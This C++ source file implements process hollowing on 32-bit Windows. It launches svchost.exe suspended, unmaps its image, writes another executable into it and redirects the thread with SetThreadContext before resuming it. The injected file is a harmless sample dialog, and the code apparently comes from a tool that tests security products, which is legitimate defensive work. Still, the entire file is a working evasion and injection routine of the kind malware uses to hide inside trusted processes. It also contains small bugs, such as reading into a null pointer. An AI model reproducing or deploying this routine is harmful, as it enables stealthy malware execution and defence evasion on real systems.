#include "pch.h"

#include "GetSetThreadContext.h"

BOOL GetSetThreadContext_Injection()
{
#ifdef _WIN64
	return TRUE; //TODO implement this on x64
#else
	TCHAR lpApplicationName[] = _T("C:\\Windows\\System32\\svchost.exe");
	TCHAR lpApplicationName2[] = _T("C:\\masm32\\examples\\dialogs_later\\basic\\basicdlg.exe");
	BOOL bResult = FALSE;

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	PCONTEXT pContext = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	SecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&ProcessInfo, sizeof(PPROCESS_INFORMATION));

	do { /* not a loop */

		// Create the hollowed process in suspended mode
		if (!CreateProcess(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo)) {
			print_last_error(_T("CreateProcess"));
			break;
		}

		// Allocate space for context structure	
		LPVOID pTargetImageBase = NULL;

		pContext = PCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));
		if (pContext == NULL) {
			print_last_error(_T("VirtualAlloc"));
			break;
		}

		// Get the thread context of target
		pContext->ContextFlags = CONTEXT_FULL;
		if (!GetThreadContext(ProcessInfo.hThread, pContext)) {
			print_last_error(_T("GetThreadContext"));	
			break;
		}

		// Read the image base address of target
		ReadProcessMemory(ProcessInfo.hProcess, LPCVOID(pContext->Ebx + 8), pTargetImageBase, 4, NULL);

		// Opening source image
		hFile = CreateFile(lpApplicationName2, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			print_last_error(_T("CreateFile"));
			break;
		}

		// Reading the file
		DWORD dwSize = GetFileSize(hFile, 0);
		DWORD dwBytesRead;
		PBYTE pBuffer = static_cast<PBYTE>(MALLOC(dwSize));

		if (pBuffer == NULL) {
			print_last_error(_T("HeapAlloc"));
			break;
		}
		else {

			SecureZeroMemory(pBuffer, dwSize);

			ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
			PIMAGE_SECTION_HEADER pImageSectionHeader;

			PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
			if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
			{
				PIMAGE_NT_HEADERS32 pNTHeaders = PIMAGE_NT_HEADERS(DWORD(pBuffer) + pDosHeader->e_lfanew);
				if (pNTHeaders->Signature == IMAGE_NT_SIGNATURE)
				{

					if (DWORD(pTargetImageBase) == pNTHeaders->OptionalHeader.ImageBase)
					{
						pNtUnmapViewOfSection NtUnmapViewOfSection;
						NtUnmapViewOfSection = (pNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
						NtUnmapViewOfSection(ProcessInfo.hProcess, pTargetImageBase);
					}

					LPVOID pImageBase;

					pImageBase = VirtualAllocEx(ProcessInfo.hProcess, LPVOID(pNTHeaders->OptionalHeader.ImageBase),
						pNTHeaders->OptionalHeader.SizeOfImage,
						MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

					if (pImageBase == NULL) {
						print_last_error(_T("VirtualAllocEx"));
						break;
					}
					else {

						WriteProcessMemory(ProcessInfo.hProcess, pImageBase, pBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
						for (int Count = 0; Count < pNTHeaders->FileHeader.NumberOfSections; Count++)
						{
							pImageSectionHeader = PIMAGE_SECTION_HEADER(DWORD(pBuffer) + pDosHeader->e_lfanew + 248 + (Count * 40));
							WriteProcessMemory(ProcessInfo.hProcess, LPVOID(DWORD(pImageBase) + pImageSectionHeader->VirtualAddress),
								LPVOID(DWORD(pBuffer) + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, NULL);
						}
						WriteProcessMemory(ProcessInfo.hProcess, LPVOID(pContext->Ebx + 8), LPVOID(&pNTHeaders->OptionalHeader.ImageBase), 4, NULL);
						pContext->Eax = DWORD(pImageBase) + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
						SetThreadContext(ProcessInfo.hThread, LPCONTEXT(pContext));

						LONG dwRet;

						dwRet = ResumeThread(ProcessInfo.hThread);
						bResult = (dwRet != -1);
					}
				}
			}

			FREE(pBuffer);
		}

	} while (FALSE); /* not a loop */

	/* Cleanup */
	if (ProcessInfo.hThread) CloseHandle(ProcessInfo.hThread);
	if (ProcessInfo.hProcess) CloseHandle(ProcessInfo.hProcess);
	if (pContext) VirtualFree(pContext, 0, MEM_RELEASE);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

	return bResult;
#endif
}
